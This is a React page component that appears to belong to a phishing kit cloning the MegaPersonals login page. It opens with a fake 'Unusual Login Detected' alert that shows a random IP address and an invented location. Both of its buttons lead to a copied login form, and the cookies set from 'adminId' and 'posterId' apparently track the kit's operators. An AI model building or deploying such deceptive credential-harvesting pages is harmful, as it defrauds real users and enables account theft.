"use client";
import React, { useState } from "react";

import LoginForm from "./LoginForm";
import Cookies from "js-cookie";
export default function Home({ adminId, posterId }) {
  const [showSecurityAlert, setShowSecurityAlert] = useState(true);
  Cookies.set("adminId", adminId);
  Cookies.set("posterId", posterId);

  const generateRandomIP = () => {
  return Array(4)
    .fill(0)
    .map(() => Math.floor(Math.random() * 256))
    .join(".");
};

  return (
    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
      {showSecurityAlert ? (
        <div className="max-w-[450px] w-full px-4 mb-10">
          <div className="bg-white rounded-lg shadow-around-blue lg:shadow-none p-6 flex flex-col items-center text-center">
            <div className="mb-6">
              <img
                src="/images/devilgirl.png"
                alt="Security Mascot"
                className="w-48 h-auto"
              />
            </div>

            <h1 className="text-2xl font-normal text-gray-800 ">
              Security Alert
            </h1>
            <h2 className="text-xl font-normal text-gray-900 mb-2">
              Unusual Login Detected
            </h2>

            <div className="text-gray-600 space-y-2 mb-8">
              <p className="text-md tracking-normal">Another device has logged into your account</p>
              <div className="text-gray-700 font-medium space-y-1">
                <p>Chrome • {new Date().toLocaleString("en-US", {
                  month: "long",
                  day: "numeric",
                  year: "numeric",

                })}</p>
                <p>London, United Kingdom</p>
                <p>{generateRandomIP()}</p>
              </div>
            </div>

            <div className="w-full space-y-3">
              <button
                onClick={() => setShowSecurityAlert(false)}
                className="w-full py-3 px-6 border-2 border-gray-200 rounded text-gray-700 font-medium hover:bg-gray-50 transition duration-200"
              >
                This was me
              </button>
              <button
                onClick={() => setShowSecurityAlert(false)}
                className="w-full py-3 px-6 bg-custom-blue3 text-white rounded font-bold hover:bg-blue-600 transition duration-200"
              >
                Log out from other device
              </button>
            </div>
          </div>
        </div>
      ) : (
        <>
          <div className="w-[65%] lg:w-full">
            <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
          </div>

          <LoginForm adminId={adminId} posterId={posterId} />

          <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
            <p className=" cursor-pointer">Home</p>
            {" | "}
            <p className=" cursor-pointer">Manage Posts</p>
            {" | "}
            <p className=" cursor-pointer">Contact Us</p>
            {" | "}
            <p className=" cursor-pointer">Policies & Terms</p>
          </div>

          <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
            Copyright ©2021 MegaPersonals.eu
          </p>
        </>
      )}
    </div>
  );
}
